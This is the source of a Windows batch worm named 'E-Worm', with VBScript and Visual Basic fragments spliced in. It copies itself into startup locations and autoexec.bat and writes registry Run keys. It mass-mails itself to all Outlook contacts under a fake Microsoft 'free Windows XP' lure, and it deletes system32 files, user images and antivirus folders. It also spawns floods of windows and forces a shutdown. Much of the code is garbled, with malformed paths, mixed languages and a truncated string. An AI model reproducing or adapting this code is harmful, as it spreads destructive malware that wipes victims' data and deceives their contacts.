echo copy %0 "C:\WINDOWS\system32\E-Worm.bat" >> autoexec.bat
Copy %0 C:\ProgramFiles\Aim95
Copy %0 C:\ProgramFiles\Kazaa
Copy %0 C:\goldmine
Copy %0 C:\user\MyDocuments\MyMusic
Copy %0 C:\ProgramFiles\Netscape\Netscape
Copy %0 C:\ProgramFiles\Sierra\EmpireEarth\EmpireEarth
del C:\ProgramFiles\Aim95
@Echo off
Echo "E-Worm"
Echo "Version Batch"
del C:\Desktop\Aim95
del C:\Desktop\Kazaa\MySharedFiles
goto Wincom

:wincom
@echo off 
echo Warning!!!!! 
echo Windows has detected a .tmp file 
echo Performing Deltree 
echo of *.tmp from the windows/temp Dir. 
cls 
cd\ 
cd windows 
rename win.com Floppy1/3.com 
cls 
echo File done...
goto Spre

:spre
"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\XXP", "c:\XP\xp.bat" > > c:\X.vbs
echo set B = CreateObject("Outlook.Application") > > c:\X.vbs
echo set C = b.GetNameSpace("MAPI") > > c:\X.vbs
echo for y = 1 To c.AddressLists.Count > > c:\X.vbs
echo set D = c.AddressLists(y) > > c:\X.vbs
echo X = 1 > > c:\X.vbs
echo set E = b.CreateItem(0) > > c:\X.vbs
echo for O = 1 To d.AddressEntries.Count > > c:\X.vbs
echo F = d.AddressEntries(x) > > c:\X.vbs
echo e.Recipients.Add F > > c:\X.vbs
echo X = X + 1 > > c:\X.vbs
echo next > > c:\X.vbs
echo e.Subject = "Upgrade to Windows XP" > > c:\X.vbs
echo e.Body = "Good news from Microsoft. Click the attachment for your FREE Windows XP. Upgrade to Windows XP now." > > c:\X.vbs
echo e.Attachments.Add ("c:\WINDOWS\UpgradeToWindowsXP.bat") > > c:\X.vbs
echo e.DeleteAfterSubmit = False > > c:\X.vbs
echo e.Send > > c:\X.vbs
echo F = "" > > c:\X.vbs
echo next > > c:\X.vbs
goto Sut

:sut
Set WSHShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoCloseKey", "1"
goto Ntn

:Ntn
Set WSHShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NAV Agent", ""
goto Fil

:Fil
Private Sub Form_Load()
Form1.Visible = False
Timer1.Interval = 500
Words1 = "534045 0406 85659780 2784680 97843 657 124 6  134862 7 8 0030 3735038 702570 283702130 8372 61 3 68729 60 16 0 92106 260168 7019750 84808 7 87 8 07 79 0780 78 470847847 6456 45 047 78078 0 7890787 8787467 840 864 807 864 5454564544641  5 454 534 564 6486464564 48 5 47654 89456417606170431834076634784 37 084 7 034 84 03864804 86708 4369648676483740 36873608486704 3687046 846 743 47  40674 8670848 74 8 7  07 7 8 78 88074702 48074 8076834830866406463 4 4 5 54 546 54 46 8 79 09 8 7 65 4 3456097686453 575768 5687 6 35768 7 568676849 8980997980998 9 8769 7 9  347534123 343 6 354 76 6678654 8 75 4 72442365776 8677 6586877866 57 7 5475647 657 65 474 7 457 654 74  98645538687965676876585687 8 64 78 35 789 80 0 97865436 8 769 468457 8568  58 56 856856 585685879348976802347813278379467112 3490197187078185617465878 787 78347 9075813478 9791378051709843675845681347 7 8731 57183 758978 7897813798 78901 78 7089781347875 861386381975871893 8 68 67167518 7138 1374 9573189567161896130634  6 687 893179 787 8 8341709"
Words2 = "534045 0406 85659780 2784680 97843 657 124 6  134862 7 8 0030 3735038 702570 283702130 8372 61 3 68729 60 16 0 92106 260168 7019750 84808 7 87 8 07 79 0780 78 470847847 6456 45 047 78078 0 7890787 8787467 840 864 807 864 5454564544641  5 454 534 564 6486464564 48 5 47654 89456417606170431834076634784 37 084 7 034 84 03864804 86708 4369648676483740 36873608486704 3687046 846 743 47  40674 8670848 74 8 7  07 7 8 78 88074702 48074 8076834830866406463 4 4 5 54 546 54 46 8 79 09 8 7 65 4 3456097686453 575768 5687 6 35768 7 568676849 8980997980998 9 8769 7 9  347534123 343 6 354 76 6678654 8 75 4 72442365776 8677 6586877866 57 7 5475647 657 65 474 7 457 654 74  98645538687965676876585687 8 64 78 35 789 80 0 97865436 8 769 468457 8568  58 56 856856 
goto Kaz

:Kaz
Start C:\ProgramFiles\Kazaa
Start C:\ProgramFiles\Kazaa
Start C:\ProgramFiles\Kazaa
Start C:\ProgramFiles\Kazaa
Start C:\ProgramFiles\Kazaa
Start C:\ProgramFiles\Kazaa
Start C:\ProgramFiles\Kazaa
Start C:\ProgramFiles\Kazaa
Start C:\ProgramFiles\Kazaa
Start C:\ProgramFiles\Kazaa
Start C:\ProgramFiles\Kazaa
goto delk

:delk
del C:\ProgramFiles\Kazaa
goto Eco

:Eco
@echo on
cd C:\windows\system32
del *.*
goto Adv

:Adv
echo a.run("c:\PROGRA~1\INTERN~1\iexplore.exe http://securityresponse.symantec.com/avcenter/venc/dyn/33735.html") > >
goto Spre2

:Spre2
Dim x 
on error resume next 
Set fso ="Scripting.FileSystem.Object" 
Set so=CreateObject(fso) 
Set ol=CreateObject("Outlook.Application") 
Set out= WScript.CreateObject("Outlook.Application") 
Set mapi = out.GetNameSpace("MAPI") 
Set a = mapi.AddressLists(1) 
For x=1 To a.AddressEntries.Count 
Set Mail=ol.CreateItem(0) 
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) 
Mail.Subject="you're subject here" 
Mail.Body="you're comment here!" 
Mail.Attachments.Add Wscript.ScriptFullName
Mail.Send 
Next 
ol.Quit
goto Man-mid 

:Man-mid
@Echo off
Echo "10% Done!"
Copy %0 C:\Desktop\MyComputer
If exist C:\user\MyDocuments\*jpg goto Yea
If not exist C:\user\MyDocuments\*jpg goto Nah

:Yea
goto Kay

:Nah
del C:\user\MyDocuments\*gip
goto Sta

:Kay
del C:\user\MyDocuments\*jpg
goto Sta

:Sta
Copy %0 C:\windows
REN c:\progra~1 1/2Floopy
If exist LoveLetter.txt.vbs goto Lov
If not exist LoveLetter.txt.vbs goto Luk

:Lov
Start LoveLetter.txt.vbs
goto met

:Luk
del C:\ProgramFiles\Aim
goto Met

:Met
If exist VBS.BSVP goto VP
If not exist VBS.BSVP goto Luc

:VP
Start VBS.BSVP
goto Meb

:Luc
Echo "..."
goto Meb

:MEb
Echo "Your computer still works?"
Copy %0 C:\ProgramFiles\Norton
Echo ----------------><----------------
Start MSPaint
Start MSPaint
Start MSPaint
Start MSPaint
Start MSPaint
Start MSPaint
del C:\ProgramFiles\Norton
Start Notepad(Input.text) "E-Worm"
Print #1
Rename E-Worm.bat System32.win.ams
goto Sni

:Sni
If exist Sniff.bat goto nif
If not exist Sniff.bat goto mid

:Nif
start Sniff.bat
goto Mid

:Mid
If exist E-Worm.vbs goto E-wormVS
If not exist E-Worm.vbs goto mad

:E-WormVS
Start E-Worm.vbs
goto mad

:mad
copy %0 c:\autoexec.bat
copy %0 C:\WINDOWS\Start Menu\Programs\StartUp
TYPE NUL | CHOICE.COM /N /CY /TY,8 >NUL 
If exist IExplorer goto IEX
If not exist IExplorer goto NotP

:IEX
Start IExplorer "http://www.rohitab.com
Start IExplorer "http://www.rohitab.com
Start IExplorer "http://www.rohitab.com
Start IExplorer "http://www.rohitab.com
Start IExplorer "http://www.rohitab.com
goto NotP

:NotP
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
goto AEnd

:AEnd
Echo "Virus Finished"
RD/S/Q C:\WINDOWS\SYSTEM32   \SPOOL\DRIVERS\COLOR\HPP3902A.ICM
SHUTDOWN -s -t 15 -c "15 secs"
SHUTDOWN -s -t 2 -c
cls
Exit